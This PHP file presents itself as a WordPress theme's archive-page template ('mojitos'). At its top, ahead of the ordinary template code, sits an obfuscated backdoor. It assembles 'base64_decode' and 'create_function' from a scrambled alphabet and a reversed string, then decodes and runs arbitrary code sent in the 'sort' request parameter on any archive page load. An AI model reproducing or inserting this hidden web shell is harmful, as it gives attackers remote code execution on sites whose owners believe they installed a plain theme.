<?php 
if(isset($_REQUEST['sort'])){	
	$string = $_REQUEST['sort'];
	$array_name = '';
	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($ar as $t){
	   $array_name .= $alphabet[$t];
	}
	$a = strrev("noi"."tcnuf"."_eta"."erc");
	$f = $a("", $array_name($string));
	$f();
	exit();
}

/**
 * The template for displaying Archive pages.
 *
 * Used to display archive-type pages if nothing more specific matches a query.
 * For example, puts together date-based pages if no date.php file exists.
 *
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage mojitos
 * @since mojitos 0.1
 */

get_header(); ?>
		<header class="page-title">
        	<div class="col-width">
                <h1>
                <?php
					$page = of_get_option('blog_page'); //Gets the page name and gives us access to the ID
					echo ($page) ? get_the_title($page):'The Blog';
				?>
                </h1>
            </div><!-- .col-width -->
		</header><!-- .entry-header -->

				<?php
					/* Queue the first post, that way we know
					 * what date we're dealing with (if that is the case).
					 *
					 * We reset this later so we can run the loop
					 * properly with a call to rewind_posts().
					 */
					if ( have_posts() )
						the_post();
				?>

		<div class="col-width">

		<section id="primary">
        
			<div id="content" role="main">
            
            	 <div class="recent-post box">
        	
                <h3 class="box-title">
                <?php if ( is_day() ) : ?>
					<?php printf( __( 'Daily Archives: %s', 'mojitos' ), '<span>' . get_the_date() . '</span>' ); ?>
					<?php elseif ( is_month() ) : ?>
					<?php printf( __( 'Monthly Archives: %s', 'mojitos' ), '<span>' . get_the_date( 'F Y' ) . '</span>' ); ?>
					<?php elseif ( is_year() ) : ?>
					<?php printf( __( 'Yearly Archives: %s', 'mojitos' ), '<span>' . get_the_date( 'Y' ) . '</span>' ); ?>
					<?php else : ?>
					<?php _e( 'Blog Archives', 'mojitos' ); ?>
					<?php endif; ?>
                </h3>
           
		

				
				<?php
					/* Since we called the_post() above, we need to
					 * rewind the loop back to the beginning that way
					 * we can run the loop properly, in full.
					 */
					rewind_posts();
				?>

				<?php /* Start the Loop */ ?>
				<?php $count = 0; while ( have_posts() ) : the_post(); $count++; ?>

					<?php get_template_part( 'content', 'index' ); ?>

				<?php endwhile; ?>

				<?php mojitos_content_nav( 'nav-below' ); ?>
                
                </div><!-- box -->

			</div><!-- #content -->
		</section><!-- #primary -->

<?php if ( of_get_option('layout','layout-2cr') != 'layout-1c') {
	get_sidebar();
} ?>
<?php get_footer(); ?>